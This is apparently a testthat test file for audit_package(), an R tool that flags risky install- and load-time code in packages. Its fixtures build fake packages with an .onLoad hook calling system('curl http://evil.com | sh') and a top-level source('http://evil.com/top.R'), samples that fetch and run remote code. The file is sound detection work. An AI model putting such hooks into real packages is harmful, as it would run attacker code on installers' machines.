rules <- load_rules()

# structure --------------------------------------------------------------------
test_that("audit_package() returns a pkgaudit object of four frames plus metadata", {
  pkg <- make_pkg(files = list("R/zzz.R" = "invisible(NULL)"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_s3_class(res, "pkgaudit")
  expect_named(res, c("file_contexts", "code_contexts", "patterns", "errors",
                      "metadata"))
  for (nm in c("file_contexts", "code_contexts", "patterns", "errors")) {
    expect_s3_class(res[[nm]], "data.frame")
  }
  expect_type(res$metadata, "list")

  expect_named(res$file_contexts,
               c("rule", "file_context", "message", .phase_columns))
  expect_named(res$code_contexts,
               c("rule", "file_context", "line_number", "column_number",
                 "message", .phase_columns))
  expect_named(res$patterns,
               c("rule", "file_context", "line_number", "column_number",
                 "message", "attck", "code_context", .phase_columns))
  expect_named(res$errors, c("stage", "file_context", "rule", "message"))
})

test_that("audit_package() resolves the phases of every finding", {
  pkg <- make_pkg(files = list(
    "configure" = "#!/bin/sh",
    "R/zzz.R"   = c(".onLoad <- function(libname, pkgname) {",
                    "  system('id')", "}",
                    "helper <- function() system('id')")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # A file context takes its phases from the rule that matched it.
  configure <- res$file_contexts[res$file_contexts$rule == "configure", ]
  expect_true(configure$at_install_src)
  expect_true(configure$at_check)
  expect_false(configure$at_load)

  # A code context takes its phases from its own rule, so .onLoad() adds at_load
  # to the phases that install it.
  onload <- res$code_contexts[res$code_contexts$rule == "onLoad_base", ]
  expect_true(onload$at_load)
  expect_true(onload$at_install_src)

  # A pattern inherits the phases of the code context it sits in: the hook's
  # system() call runs at load, the one in an ordinary function runs never.
  hook <- res$patterns[res$patterns$code_context == "onLoad_base", ]
  expect_true(all(hook$at_load))

  uncalled <- res$patterns[res$patterns$code_context == "Other", ]
  expect_equal(nrow(uncalled), 1L)
  expect_false(any(unlist(uncalled[, .phase_columns])))
})

test_that("audit_package() errors on a non-directory", {
  expect_error(audit_package(tempfile()), "dir.exists")
})

# integration ------------------------------------------------------------------
test_that("audit_package() finds file contexts, code contexts and patterns", {
  pkg <- make_pkg(files = list(
    "configure"          = "#!/bin/sh",
    "src/Makevars"       = "all:",
    "src/install.libs.R" = "system2('echo', 'x')",
    "R/zzz.R" = c(
      ".onLoad <- function(libname, pkgname) {",
      "  system('curl http://evil.com | sh')",
      "}",
      "source('http://evil.com/top.R')"
    )
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  expect_setequal(res$file_contexts$file_context,
                  c("configure", "src/Makevars", "src/install.libs.R"))
  expect_true("onLoad_base" %in% res$code_contexts$rule)

  # system() in the hook, source() at top level, system2() at top level of
  # install.libs.R -> the three code-context labels are attributed correctly.
  sys_hook <- res$patterns[res$patterns$rule == "system" &
                             res$patterns$file_context == "R/zzz.R", ]
  expect_equal(sys_hook$code_context, "onLoad_base")

  src_top <- res$patterns[res$patterns$rule == "source", ]
  expect_equal(src_top$code_context, "Top-level")

  installlibs <- res$patterns[res$patterns$file_context == "src/install.libs.R", ]
  expect_equal(installlibs$rule, "system")
  expect_equal(installlibs$code_context, "Top-level")

  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() reports relative-path parse errors and continues", {
  pkg <- make_pkg(files = list(
    "R/bad.R"  = ")invalid R syntax(",
    "R/good.R" = "system('id')"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$stage, "parse_script")
  expect_equal(res$errors$file_context, "R/bad.R")
  # The good file was still audited despite the bad one.
  expect_true("R/good.R" %in% res$patterns$file_context)
})

test_that("audit_package() on a package with no scannable content is empty", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$file_contexts), 0L)
  expect_equal(nrow(res$code_contexts), 0L)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$errors), 0L)
})
